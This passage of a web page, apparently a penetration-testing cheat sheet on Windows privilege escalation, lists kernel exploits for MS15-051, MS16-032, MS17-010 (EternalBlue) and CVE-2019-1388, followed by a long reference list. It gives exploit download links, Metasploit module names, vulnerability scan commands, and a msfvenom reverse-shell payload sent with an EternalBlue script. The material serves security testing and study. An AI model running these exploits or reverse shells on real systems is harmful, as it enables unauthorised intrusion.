</span></span><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/rootphantomer/exp/raw/master/ms15-<span style=color:#ae81ff>051</span><span style=color:#66d9ef>%</span>EF<span style=color:#66d9ef>%</span>BC<span style=color:#66d9ef>%</span><span style=color:#ae81ff>88</span><span style=color:#66d9ef>%</span>E4<span style=color:#66d9ef>%</span>BF<span style=color:#66d9ef>%</span>AE<span style=color:#66d9ef>%</span>E6<span style=color:#66d9ef>%</span><span style=color:#ae81ff>94</span><span style=color:#66d9ef>%</span>B9<span style=color:#66d9ef>%</span>E7<span style=color:#66d9ef>%</span><span style=color:#ae81ff>89</span><span style=color:#66d9ef>%</span><span style=color:#ae81ff>88</span><span style=color:#66d9ef>%</span>EF<span style=color:#66d9ef>%</span>BC<span style=color:#66d9ef>%</span><span style=color:#ae81ff>89</span>/ms15-<span style=color:#ae81ff>051</span>/ms15-<span style=color:#ae81ff>051</span>/x64/ms15-<span style=color:#ae81ff>051</span>.exe
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/SecWiki/windows-kernel-exploits/tree/master/MS15-<span style=color:#ae81ff>051</span>
</span></span><span style=display:flex><span>use exploit/windows/local/ms15_051_client_copy_image
</span></span></code></pre></div><h3 id=ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64>MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)
<a class=anchor href=#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64>#</a></h3><p>Check if the patch is installed : <code>wmic qfe list | findstr "3139914"</code></p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>Powershell<span style=color:#960050;background-color:#1e0010>:</span>
</span></span><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//www.exploit-db.com/exploits/<span style=color:#ae81ff>39719</span>/
</span></span><span style=display:flex><span>https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-<span style=color:#ae81ff>032</span>.ps1
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Binary exe <span style=color:#960050;background-color:#1e0010>:</span> https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/Meatballs1/ms16-<span style=color:#ae81ff>032</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Metasploit <span style=color:#960050;background-color:#1e0010>:</span> exploit/windows/local/ms16_032_secondary_logon_handle_privesc
</span></span></code></pre></div><h3 id=ms17-010-eternal-blue>MS17-010 (Eternal Blue)
<a class=anchor href=#ms17-010-eternal-blue>#</a></h3><p>Check the vulnerability with the following nmap script or crackmapexec: <code>crackmapexec smb 10.10.10.10 -u '' -p '' -d domain -M ms17-010</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span>nmap <span style=color:#f92672>-</span>Pn <span style=color:#f92672>-</span>p445 <span style=color:#f92672>--</span>open <span style=color:#f92672>--</span>max<span style=color:#f92672>-</span>hostgroup <span style=color:#ae81ff>3</span> <span style=color:#f92672>--</span>script smb<span style=color:#f92672>-</span>vuln<span style=color:#f92672>-</span>ms17<span style=color:#960050;background-color:#1e0010>â€“</span><span style=color:#ae81ff>010</span> <span style=color:#f92672>&lt;</span>ip_netblock<span style=color:#f92672>&gt;</span>
</span></span></code></pre></div><p>Metasploit modules to exploit <code>EternalRomance/EternalSynergy/EternalChampion</code>.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>auxiliary/admin/smb/ms17_010_command          MS17-<span style=color:#ae81ff>010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
</span></span><span style=display:flex><span>auxiliary/scanner/smb/smb_ms17_010            MS17-<span style=color:#ae81ff>010</span> SMB RCE Detection
</span></span><span style=display:flex><span>exploit/windows/smb/ms17_010_eternalblue      MS17-<span style=color:#ae81ff>010</span> EternalBlue SMB Remote Windows Kernel Pool Corruption
</span></span><span style=display:flex><span>exploit/windows/smb/ms17_010_eternalblue_win8 MS17-<span style=color:#ae81ff>010</span> EternalBlue SMB Remote Windows Kernel Pool Corruption <span style=color:#66d9ef>for</span> Win8+
</span></span><span style=display:flex><span>exploit/windows/smb/ms17_010_psexec           MS17-<span style=color:#ae81ff>010</span> EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
</span></span></code></pre></div><p>If you can&rsquo;t use Metasploit and only want a reverse shell.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=display:flex><span>git clone https<span style=color:#960050;background-color:#1e0010>:</span>//github.com/helviojunior/MS17-<span style=color:#ae81ff>010</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e># generate a simple reverse shell to use</span>
</span></span><span style=display:flex><span>msfvenom -p windows/shell_reverse_tcp LHOST=<span style=color:#ae81ff>10.10</span>.10.10 LPORT=<span style=color:#ae81ff>443</span> EXITFUNC=thread <span style=color:#f92672>-f</span> exe -a x86 --platform windows -o revshell.exe
</span></span><span style=display:flex><span>python2 send_and_execute.py <span style=color:#ae81ff>10.0</span>.0.1 revshell.exe
</span></span></code></pre></div><h3 id=cve-2019-1388>CVE-2019-1388
<a class=anchor href=#cve-2019-1388>#</a></h3><p>Exploit : <a href=https://packetstormsecurity.com/files/14437/hhupd.exe.html>https://packetstormsecurity.com/files/14437/hhupd.exe.html</a></p><p>Requirement:</p><ul><li>Windows 7</li><li>Windows 10 LTSC 10240</li></ul><p>Failing on :</p><ul><li>LTSC 2019</li><li>1709</li><li>1803</li></ul><p>Detailed information about the vulnerability : <a href=https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege>https://www.zerodayinitiative.com/blog/2019/11/19/thanksgiving-treat-easy-as-pie-windows-7-secure-desktop-escalation-of-privilege</a></p><h2 id=references>References
<a class=anchor href=#references>#</a></h2><ul><li><a href=https://docs.microsoft.com/en-us/sysinternals/learn/windows-internals>Windows Internals Book - 02/07/2017</a></li><li><a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/icacls>icacls - Docs Microsoft</a></li><li><a href=https://xapax.gitbooks.io/security/content/privilege_escalation_windows.html>Privilege Escalation Windows - Philip Linghammar</a></li><li><a href=https://guif.re/windowseop>Windows elevation of privileges - Guifre Ruiz</a></li><li><a href=https://addaxsoft.com/wpecs/>The Open Source Windows Privilege Escalation Cheat Sheet by amAK.xyz and @xxByte</a></li><li><a href=https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/>Basic Linux Privilege Escalation</a></li><li><a href=http://www.fuzzysecurity.com/tutorials/16.html>Windows Privilege Escalation Fundamentals</a></li><li><a href=https://hackmag.com/security/elevating-privileges-to-administrative-and-further/>TOPâ€“10 ways to boost your privileges in Windows systems - hackmag</a></li><li><a href=https://decoder.cloud/2017/02/21/the-system-challenge/>The SYSTEM Challenge</a></li><li><a href=https://www.absolomb.com/2018-01-26-Windows-Privilege-Escalation-Guide/>Windows Privilege Escalation Guide - absolomb&rsquo;s security blog</a></li><li><a href=https://github.com/dostoevskylabs/dostoevsky-pentest-notes/blob/master/chapter-4.md>Chapter 4 - Windows Post-Exploitation - 2 Nov 2017 - dostoevskylabs</a></li><li><a href=https://www.tecklyfe.com/remediation-microsoft-windows-unquoted-service-path-enumeration-vulnerability/>Remediation for Microsoft Windows Unquoted Service Path Enumeration Vulnerability - September 18th, 2016 - Robert Russell</a></li><li><a href=https://pentestlab.blog/2017/04/19/stored-credentials/>Pentestlab.blog - WPE-01 - Stored Credentials</a></li><li><a href=https://pentestlab.blog/2017/04/24/windows-kernel-exploits/>Pentestlab.blog - WPE-02 - Windows Kernel</a></li><li><a href=https://pentestlab.blog/2017/04/04/dll-injection/>Pentestlab.blog - WPE-03 - DLL Injection</a></li><li><a href=https://pentestlab.blog/2017/03/30/weak-service-permissions/>Pentestlab.blog - WPE-04 - Weak Service Permissions</a></li><li><a href=https://pentestlab.blog/2017/03/27/dll-hijacking/>Pentestlab.blog - WPE-05 - DLL Hijacking</a></li><li><a href=https://pentestlab.blog/2017/04/13/hot-potato/>Pentestlab.blog - WPE-06 - Hot Potato</a></li><li><a href=https://pentestlab.blog/2017/03/20/group-policy-preferences/>Pentestlab.blog - WPE-07 - Group Policy Preferences</a></li><li><a href=https://pentestlab.blog/2017/03/09/unquoted-service-path/>Pentestlab.blog - WPE-08 - Unquoted Service Path</a></li><li><a href=https://pentestlab.blog/2017/02/28/always-install-elevated/>Pentestlab.blog - WPE-09 - Always Install Elevated</a></li><li><a href=https://pentestlab.blog/2017/04/03/token-manipulation/>Pentestlab.blog - WPE-10 - Token Manipulation</a></li><li><a href=https://pentestlab.blog/2017/04/07/secondary-logon-handle/>Pentestlab.blog - WPE-11 - Secondary Logon Handle</a></li><li><a href=https://pentestlab.blog/2017/03/31/insecure-registry-permissions/>Pentestlab.blog - WPE-12 - Insecure Registry Permissions</a></li><li><a href=https://pentestlab.blog/2017/06/14/intel-sysret/>Pentestlab.blog - WPE-13 - Intel SYSRET</a></li><li><a href=https://blog.xpnsec.com/becoming-system/>Alternative methods of becoming SYSTEM - 20th November 2017 - Adam Chester @<em>xpn</em></a></li><li><a href=https://github.com/LOLBAS-Project/LOLBAS>Living Off The Land Binaries and Scripts (and now also Libraries)</a></li><li><a href=https://amonsec.net/2018/09/23/Common-Windows-Misconfiguration-Services.html>Common Windows Misconfiguration: Services - 2018-09-23 - @am0nsec</a></li><li><a href=https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf>Local Privilege Escalation Workshop - Slides.pdf - @sagishahar</a></li><li><a href=https://vulndev.io/howto/2019/03/07/diaghub.html>Abusing Diaghub - xct - March 07, 2019</a></li><li><a href=https://googleprojectzero.blogspot.com/2018/04/windows-exploitation-tricks-exploiting.html>Windows Exploitation Tricks: Exploiting Arbitrary File Writes for Local Elevation of Privilege - James Forshaw, Project Zero - Wednesday, April 18, 2018</a></li><li><a href=https://itm4n.github.io/usodllloader-part2/>Weaponizing Privileged File Writes with the USO Service - Part 2/2 - itm4n - August 19, 2019</a></li><li><a href="https://www.elladodelmal.com/2020/03/hacking-trick-environment-variable-path.html?m=1">Hacking Trick: Environment Variable $Path Interception y Escaladas de Privilegios para Windows</a></li><li><a href=https://www.tarlogic.com/en/blog/abusing-seloaddriverprivilege-for-privilege-escalation/>Abusing SeLoadDriverPrivilege for privilege escalation - 14 JUN 2018 - OSCAR MALLO</a></li><li><a href=https://pentestlab.blog/2021/08/02/universal-privilege-escalation-and-persistence-printer/>Universal Privilege Escalation and Persistence â€“ Printer - AUGUST 2, 2021)</a></li><li><a href=https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks>ABUSING ARBITRARY FILE DELETES TO ESCALATE PRIVILEGE AND OTHER GREAT TRICKS - March 17, 2022 | Simon Zuckerbraun</a></li><li><a href=https://shells.systems/post-bypassing-applocker-by-abusing-hashinfo/>Bypassing AppLocker by abusing HashInfo - 2022-08-19 - Ian</a></li><li><a href=https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/>Giving JuicyPotato a second chance: JuicyPotatoNG - @decoder_it, @splinter_code</a></li></ul></article><footer class=book-footer><div class="flex flex-wrap justify-between"><div><a class="flex align-center" href=https://github.com/m00tiny/grayhatfreelancing/commit/3579e9c4ae7712d4e8fcdd17b931224d3fca8a8d title='Last modified by Stuart Gray | December 10, 2022' target=_blank rel=noopener><img src=/svg/calendar.svg class=book-icon alt=Calendar>
<span>December 10, 2022</span></a></div></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav id=TableOfContents><ul><li><a href=#windows---privilege-escalation>Windows - Privilege Escalation</a><ul><li><a href=#tools>Tools</a></li><li><a href=#windows-version-and-configuration>Windows Version and Configuration</a></li><li><a href=#user-enumeration>User Enumeration</a></li><li><a href=#network-enumeration>Network Enumeration</a></li><li><a href=#antivirus--detections>Antivirus & Detections</a><ul><li><a href=#windows-defender>Windows Defender</a></li><li><a href=#firewall>Firewall</a></li><li><a href=#applocker-enumeration>AppLocker Enumeration</a></li><li><a href=#powershell>Powershell</a></li><li><a href=#default-writeable-folders>Default Writeable Folders</a></li></ul></li><li><a href=#eop---looting-for-passwords>EoP - Looting for passwords</a><ul><li><a href=#sam-and-system-files>SAM and SYSTEM files</a></li><li><a href=#laps-settings>LAPS Settings</a></li><li><a href=#hivenightmare>HiveNightmare</a></li><li><a href=#search-for-file-contents>Search for file contents</a></li><li><a href=#search-for-a-file-with-a-certain-filename>Search for a file with a certain filename</a></li><li><a href=#search-the-registry-for-key-names-and-passwords>Search the registry for key names and passwords</a></li><li><a href=#read-a-value-of-a-certain-sub-key>Read a value of a certain sub key</a></li><li><a href=#passwords-in-unattendxml>Passwords in unattend.xml</a></li><li><a href=#iis-web-config>IIS Web config</a></li><li><a href=#other-files>Other files</a></li><li><a href=#wifi-passwords>Wifi passwords</a></li><li><a href=#sticky-notes-passwords>Sticky Notes passwords</a></li><li><a href=#passwords-stored-in-services>Passwords stored in services</a></li><li><a href=#passwords-stored-in-key-manager>Passwords stored in Key Manager</a></li><li><a href=#powershell-history>Powershell History</a></li><li><a href=#powershell-transcript>Powershell Transcript</a></li><li><a href=#password-in-alternate-data-stream>Password in Alternate Data Stream</a></li></ul></li><li><a href=#eop---processes-enumeration-and-tasks>EoP - Processes Enumeration and Tasks</a></li><li><a href=#eop---incorrect-permissions-in-services>EoP - Incorrect permissions in services</a><ul><li><a href=#example-with-windows-10---cve-2019-1322-usosvc>Example with Windows 10 - CVE-2019-1322 UsoSvc</a></li><li><a href=#example-with-windows-xp-sp1---upnphost>Example with Windows XP SP1 - upnphost</a></li></ul></li><li><a href=#eop---windows-subsystem-for-linux-wsl>EoP - Windows Subsystem for Linux (WSL)</a></li><li><a href=#eop---unquoted-service-paths>EoP - Unquoted Service Paths</a><ul><li><a href=#example>Example</a></li></ul></li><li><a href=#eop---path-interception>EoP - $PATH Interception</a></li><li><a href=#eop---named-pipes>EoP - Named Pipes</a></li><li><a href=#eop---kernel-exploitation>EoP - Kernel Exploitation</a><ul><li></li></ul></li><li><a href=#eop---alwaysinstallelevated>EoP - AlwaysInstallElevated</a></li><li><a href=#eop---insecure-gui-apps>EoP - Insecure GUI apps</a></li><li><a href=#eop---evaluating-vulnerable-drivers>EoP - Evaluating Vulnerable Drivers</a></li><li><a href=#eop---printers>EoP - Printers</a><ul><li><a href=#universal-printer>Universal Printer</a></li><li><a href=#printernightmare>PrinterNightmare</a></li><li><a href=#bring-your-own-vulnerability>Bring Your Own Vulnerability</a></li></ul></li><li><a href=#eop---runas>EoP - Runas</a></li><li><a href=#eop---abusing-shadow-copies>EoP - Abusing Shadow Copies</a></li><li><a href=#eop---from-local-administrator-to-nt-system>EoP - From local administrator to NT SYSTEM</a></li><li><a href=#eop---living-off-the-land-binaries-and-scripts>EoP - Living Off The Land Binaries and Scripts</a></li><li><a href=#eop---impersonation-privileges>EoP - Impersonation Privileges</a><ul><li><a href=#restore-a-service-accounts-privileges>Restore A Service Account&rsquo;s Privileges</a></li><li><a href=#meterpreter-getsystem-and-alternatives>Meterpreter getsystem and alternatives</a></li><li><a href=#rottenpotato-token-impersonation>RottenPotato (Token Impersonation)</a></li><li><a href=#juicy-potato-abusing-the-golden-privileges>Juicy Potato (Abusing the golden privileges)</a></li><li><a href=#rogue-potato-fake-oxid-resolver>Rogue Potato (Fake OXID Resolver)</a></li><li><a href=#efspotato-ms-efsr-efsrpcopenfileraw>EFSPotato (MS-EFSR EfsRpcOpenFileRaw)</a></li><li><a href=#juicypotatong>JuicyPotatoNG</a></li></ul></li><li><a href=#eop---privileged-file-write>EoP - Privileged File Write</a><ul><li><a href=#diaghub>DiagHub</a></li><li><a href=#usodllloader>UsoDLLLoader</a></li><li><a href=#wertrigger>WerTrigger</a></li></ul></li><li><a href=#eop---common-vulnerabilities-and-exposure>EoP - Common Vulnerabilities and Exposure</a><ul><li><a href=#ms08-067-netapi>MS08-067 (NetAPI)</a></li><li><a href=#ms10-015-kitrap0d---microsoft-windows-nt200020032008xpvista7>MS10-015 (KiTrap0D) - Microsoft Windows NT/2000/2003/2008/XP/Vista/7</a></li><li><a href=#ms11-080-afdsys---microsoft-windows-xp2003>MS11-080 (afd.sys) - Microsoft Windows XP/2003</a></li><li><a href=#ms15-051-client-copy-image---microsoft-windows-20032008782012>MS15-051 (Client Copy Image) - Microsoft Windows 2003/2008/7/8/2012</a></li><li><a href=#ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64>MS16-032 - Microsoft Windows 7 &lt; 10 / 2008 &lt; 2012 R2 (x86/x64)</a></li><li><a href=#ms17-010-eternal-blue>MS17-010 (Eternal Blue)</a></li><li><a href=#cve-2019-1388>CVE-2019-1388</a></li></ul></li><li><a href=#references>References</a></li></ul></li></ul></nav></div></aside></main></body></html>